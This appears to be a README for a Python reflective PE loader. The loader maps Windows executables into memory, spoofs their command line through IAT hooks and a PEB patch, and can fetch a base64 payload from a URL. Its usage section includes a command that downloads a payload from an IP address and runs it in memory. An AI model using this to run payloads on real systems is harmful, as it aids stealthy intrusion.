# peloader.py — Python Reflective PE Loader

Reflective PE64 loader using ctypes. Maps a PE into the current Python process, resolves imports, applies relocations, spoofs the command line (IAT hooks + PEB patch), and runs the entry point in a new thread. Pure stdlib — no external dependencies.

## How It Works

1. Reads PE from file, URL (base64-encoded), or inline base64 string
2. Allocates RWX memory via `VirtualAlloc` and maps PE headers + all sections
3. Processes base relocations (`IMAGE_REL_BASED_DIR64`)
4. Resolves imports via IAT (`LoadLibraryA` + `GetProcAddress`), with optional IAT hooks for command line spoofing (`GetCommandLineA`/`GetCommandLineW`)
5. Sets correct page protections per section characteristics (execute/read/write)
6. If a command line is provided:
   - IAT hooks redirect `GetCommandLineA`/`GetCommandLineW` to attacker-controlled buffers
   - PEB `ProcessParameters.CommandLine` is patched in-place (or reallocated if the new string is longer)
7. Runs the entry point in a new thread with 8MB stack via `CreateThread`, waits for completion

## Usage

```bash
# From a local PE file
python peloader.py payload.exe

# From a local file with arguments passed to the PE
python peloader.py payload.exe -- -f chrome --verbose

# From a URL (server must return base64-encoded PE)
python peloader.py http://10.1.123.5:8877/payload.b64

# From inline base64
python peloader.py --b64 TVqAAA...

# Override the spoofed exe name (default: app.exe)
python peloader.py --name chrome.exe payload.exe -- -f chrome
```

## Command Line Spoofing

When `-- pe_args...` are provided, the loader spoofs the PE's view of its command line through two mechanisms:

1. **IAT hooks**: `GetCommandLineA` and `GetCommandLineW` are redirected to return the spoofed string. This catches most CRT command-line parsing (`__getmainargs`, `CommandLineToArgvW`).
2. **PEB patch**: The `ProcessParameters.CommandLine` UNICODE_STRING in the PEB is overwritten. If the new string fits in the existing buffer, it's written in-place. Otherwise, a new buffer is allocated and the pointer/length fields are updated.

## API

The loader can also be used as a library:

```python
import peloader

with open('payload.exe', 'rb') as f:
    pe_data = f.read()

# Run without arguments
peloader.run(pe_data)

# Run with spoofed command line
peloader.run(pe_data, cmdline='chrome.exe -f chrome')

# Just map without executing (returns base address and entry point RVA)
base, ep_rva = peloader.map_pe(pe_data)
```

## Limitations

- **PE64 only** — PE32 (32-bit) is not supported (asserts `IMAGE_FILE_HEADER.Magic == 0x20B`)
- **No TLS callbacks** — TLS directory is not processed; PEs relying on TLS callbacks will malfunction
- **No exception handling setup** — structured exception handling (SEH/VEH) is not initialized for the loaded PE
- **CRT conflicts** — PEs with heavy CRT initialization (especially Go/Rust runtimes) may crash because they expect to own the process
- **ExitProcess kills the host** — the loaded PE calling `ExitProcess` terminates the Python process; the PowerShell port (`peloader.ps1`) adds an IAT hook for this, but this Python version does not
- **Ordinal imports via GetProcAddress** — ordinal imports use a cast to `c_char_p` which works but is technically a type pun

## Requirements

- Python 3.6+ on Windows (uses `ctypes.windll`)
- No external dependencies (stdlib only)
- Target PE must be x86-64
